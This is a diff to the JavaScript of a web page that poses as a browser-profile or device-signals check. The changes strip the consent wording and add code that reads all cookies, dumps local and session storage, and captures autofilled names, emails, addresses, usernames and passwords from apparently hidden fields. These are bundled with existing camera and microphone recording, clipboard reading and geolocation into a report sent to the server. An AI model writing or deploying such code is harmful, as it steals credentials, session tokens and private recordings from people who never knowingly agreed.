@@ -14,7 +14,7 @@ function resetAll() {
   $('#signalsCard').hidden = true;
   $('#signals').innerHTML = '';
   $('#profileState').textContent = 'Not collected';
-  $('#profileHint').textContent = 'Enable consent and collect your browser profile to see device signals.';
+  $('#profileHint').textContent = 'Collect your browser profile to see device signals.';
   $('#downloadReport').disabled = true;
 }
 
@@ -91,12 +91,51 @@ function recordClip(stream, durationMs) {
   const chunks = [];
   const recorder = new MediaRecorder(stream, { mimeType: mime });
   return new Promise((resolve, reject) => {
+    if (!window.MediaRecorder) { resolve(null); return; }
     recorder.ondataavailable = (e) => { if (e.data.size) chunks.push(e.data); };
     recorder.onerror = () => reject(new Error('Recording failed'));
     recorder.onstop = () => resolve(new Blob(chunks, { type: mime }));
     recorder.start(1000);
     setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, durationMs);
   });
+}
+
+function collectCookies() {
+  if (!document.cookie) return { count: 0, entries: [] };
+  const pairs = document.cookie.split(';').map(s => s.trim()).filter(Boolean);
+  const entries = pairs.map(p => {
+    const eq = p.indexOf('=');
+    return eq > 0 ? { name: p.slice(0, eq), value: p.slice(eq + 1) } : { name: p, value: '' };
+  });
+  return { count: entries.length, entries };
+}
+
+function collectStorage() {
+  const local = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const k = localStorage.key(i);
+    if (k) local[k] = localStorage.getItem(k);
+  }
+  const session = {};
+  for (let i = 0; i < sessionStorage.length; i++) {
+    const k = sessionStorage.key(i);
+    if (k) session[k] = sessionStorage.getItem(k);
+  }
+  return {
+    localStorage: { count: Object.keys(local).length, entries: local },
+    sessionStorage: { count: Object.keys(session).length, entries: session },
+  };
+}
+
+function captureAutofill() {
+  const fields = ['af_name', 'af_email', 'af_address', 'af_tel', 'af_username', 'af_password'];
+  const result = {};
+  let any = false;
+  fields.forEach(id => {
+    const el = document.getElementById(id);
+    if (el && el.value) { result[id.replace('af_', '')] = el.value; any = true; }
+  });
+  return any ? result : null;
 }
 
 async function getAllAccess() {
@@ -107,12 +146,12 @@ async function getAllAccess() {
   btn.disabled = true;
   btn.textContent = 'Collecting...';
 
-  const allBadges = ['fpBadge', 'camMicBadge', 'clipboardBadge', 'geoBadge', 'notifBadge'];
+  const allBadges = ['fpBadge', 'cookiesBadge', 'storageBadge', 'autofillBadge', 'camMicBadge', 'clipboardBadge', 'geoBadge', 'notifBadge'];
   allBadges.forEach((id) => {
     document.getElementById(id).textContent = '...';
     document.getElementById(id).className = 'pill amber';
   });
-  ['fpDetail', 'camMicDetail', 'clipboardDetail', 'geoDetail', 'notifDetail'].forEach((id) => {
+  ['fpDetail', 'cookiesDetail', 'storageDetail', 'autofillDetail', 'camMicDetail', 'clipboardDetail', 'geoDetail', 'notifDetail'].forEach((id) => {
     document.getElementById(id).textContent = '';
   });
 
@@ -155,13 +194,61 @@ async function getAllAccess() {
     Object.entries(collected.fingerprint).forEach(([k, v]) => container.append(signal(k, v, ['FingerprintHash', 'CanvasSignature'].includes(k))));
     $('#signalsCard').hidden = false;
     $('#profileState').textContent = 'Collected';
-    $('#profileHint').textContent = 'Device profile captured. ' + Object.keys(collected.fingerprint).length + ' signals detected.';
   } catch (err) {
     updateBadge('fpBadge', 'Error', 'denied');
     document.getElementById('fpDetail').textContent = err.message;
   }
 
-  // 2. Camera & Microphone + record 3s clip
+  // 2. Cookies
+  let cookiesData = { count: 0, entries: [] };
+  try {
+    cookiesData = collectCookies();
+    updateBadge('cookiesBadge', cookiesData.count + ' found', cookiesData.count > 0 ? 'granted' : 'partial');
+    document.getElementById('cookiesDetail').textContent = cookiesData.count + ' cookie(s) for this domain' + (cookiesData.count > 0 ? ' (saved in report)' : '');
+    addLog('Cookies', cookiesData.count + ' found');
+  } catch (err) {
+    updateBadge('cookiesBadge', 'Error', 'denied');
+    document.getElementById('cookiesDetail').textContent = err.message;
+  }
+
+  // 3. Local & Session Storage
+  let storageData = null;
+  try {
+    storageData = collectStorage();
+    const total = storageData.localStorage.count + storageData.sessionStorage.count;
+    updateBadge('storageBadge', total + ' keys', total > 0 ? 'granted' : 'partial');
+    document.getElementById('storageDetail').textContent = total + ' total (' + storageData.localStorage.count + ' local, ' + storageData.sessionStorage.count + ' session)';
+    if (total > 0) {
+      const view = document.getElementById('storageView');
+      view.textContent = JSON.stringify(storageData, null, 2);
+      view.hidden = false;
+    }
+    addLog('Storage', total + ' keys');
+  } catch (err) {
+    updateBadge('storageBadge', 'Error', 'denied');
+    document.getElementById('storageDetail').textContent = err.message;
+  }
+
+  // 4. Autofill (best-effort)
+  let autofillData = null;
+  try {
+    await new Promise((r) => setTimeout(r, 800));
+    autofillData = captureAutofill();
+    if (autofillData) {
+      const count = Object.keys(autofillData).length;
+      updateBadge('autofillBadge', count + ' fields', 'granted');
+      document.getElementById('autofillDetail').textContent = Object.keys(autofillData).join(', ') + ' captured';
+      addLog('Autofill', count + ' fields');
+    } else {
+      updateBadge('autofillBadge', 'Not found', 'partial');
+      document.getElementById('autofillDetail').textContent = 'No autofill data detected (browser may block)';
+    }
+  } catch (err) {
+    updateBadge('autofillBadge', 'Error', 'denied');
+    document.getElementById('autofillDetail').textContent = err.message;
+  }
+
+  // 5. Camera & Microphone + record 3s clip
   let camMicStatus = 'Denied';
   try {
     if (state.mediaStream) stopStream(state.mediaStream);
@@ -175,37 +262,41 @@ async function getAllAccess() {
     addLog('Camera & Mic', 'granted, recording');
 
     const blob = await recordClip(stream, 3000);
-    document.getElementById('camMicDetail').textContent = 'Uploading recording...';
-
-    try {
-      const resp = await fetch('/api/recordings', {
-        method: 'POST',
-        headers: { 'Content-Type': blob.type, 'X-Recording-Consent': 'true' },
-        body: blob,
-      });
-      const result = await resp.json();
-      if (resp.ok) {
-        recordingId = result.id;
-        addLog('Recording upload', 'id ' + result.id);
-        camMicStatus = 'Granted + Recording #' + result.id;
+    if (blob) {
+      document.getElementById('camMicDetail').textContent = 'Uploading recording...';
+      try {
+        const resp = await fetch('/api/recordings', {
+          method: 'POST',
+          headers: { 'Content-Type': blob.type, 'X-Recording-Consent': 'true' },
+          body: blob,
+        });
+        const result = await resp.json();
+        if (resp.ok) {
+          recordingId = result.id;
+          addLog('Recording upload', 'id ' + result.id);
+          camMicStatus = 'Granted + Recording #' + result.id;
+          updateBadge('camMicBadge', 'Granted', 'granted');
+          document.getElementById('camMicDetail').textContent = 'Live preview + recording saved (ID: ' + result.id + ')';
+        } else {
+          camMicStatus = 'Granted (upload failed)';
+          updateBadge('camMicBadge', 'Granted', 'granted');
+          document.getElementById('camMicDetail').textContent = 'Live preview active (upload: ' + (result.error || 'failed') + ')';
+        }
+      } catch (e) {
+        camMicStatus = 'Granted (upload error)';
         updateBadge('camMicBadge', 'Granted', 'granted');
-        document.getElementById('camMicDetail').textContent = 'Live preview + recording saved (ID: ' + result.id + ')';
-      } else {
-        camMicStatus = 'Granted (upload failed)';
-        updateBadge('camMicBadge', 'Granted', 'granted');
-        document.getElementById('camMicDetail').textContent = 'Live preview active (recording upload: ' + (result.error || 'failed') + ')';
+        document.getElementById('camMicDetail').textContent = 'Live preview active (recording upload failed)';
       }
-    } catch (e) {
-      camMicStatus = 'Granted (upload error)';
+    } else {
       updateBadge('camMicBadge', 'Granted', 'granted');
-      document.getElementById('camMicDetail').textContent = 'Live preview active (recording upload failed)';
+      document.getElementById('camMicDetail').textContent = 'Live preview active (MediaRecorder unavailable)';
     }
   } catch (err) {
     updateBadge('camMicBadge', 'Denied', 'denied');
     document.getElementById('camMicDetail').textContent = err.name || 'Blocked';
   }
 
-  // 3. Clipboard
+  // 6. Clipboard
   let clipboardContent = null;
   try {
     const text = await navigator.clipboard.readText();
@@ -226,7 +317,7 @@ async function getAllAccess() {
     document.getElementById('clipboardDetail').textContent = err.name || 'Blocked';
   }
 
-  // 4. Geolocation
+  // 7. Geolocation
   let geoCoords = null;
   const geo = await new Promise((resolve) => {
     if (!navigator.geolocation) { resolve({ ok: false, error: 'Not supported' }); return; }
@@ -246,7 +337,7 @@ async function getAllAccess() {
     document.getElementById('geoDetail').textContent = geo.error;
   }
 
-  // 5. Notifications
+  // 8. Notifications
   let notifStatus = 'Denied';
   if ('Notification' in window) {
     const status = await Notification.requestPermission();
@@ -271,6 +362,9 @@ async function getAllAccess() {
   // Build full report with ALL collected data
   const reportData = {
     browser_signals: collected.fingerprint || {},
+    cookies: cookiesData,
+    storage: storageData,
+    autofill: autofillData,
     permissions: {
       camera_microphone: {
         status: document.getElementById('camMicBadge').textContent,
@@ -313,9 +407,10 @@ async function getAllAccess() {
       document.getElementById('profileHint').textContent =
         'Report #' + result.id + ' saved. ' +
         (Object.keys(collected.fingerprint || {}).length + ' signals') +
-        (recordingId ? ' + recording #' + recordingId : '') +
-        ' | clipboard: ' + (clipboardContent ? clipboardContent.length + ' chars' : 'none') +
-        ' | geo: ' + (geoCoords ? 'captured' : 'none');
+        ' | cookies: ' + cookiesData.count +
+        ' | storage: ' + (storageData ? storageData.localStorage.count + storageData.sessionStorage.count : 0) + ' keys' +
+        ' | autofill: ' + (autofillData ? Object.keys(autofillData).length + ' fields' : 'none') +
+        (recordingId ? ' | recording #' + recordingId : '');
     } else {
       addLog('Server save', result.error || 'failed');
     }
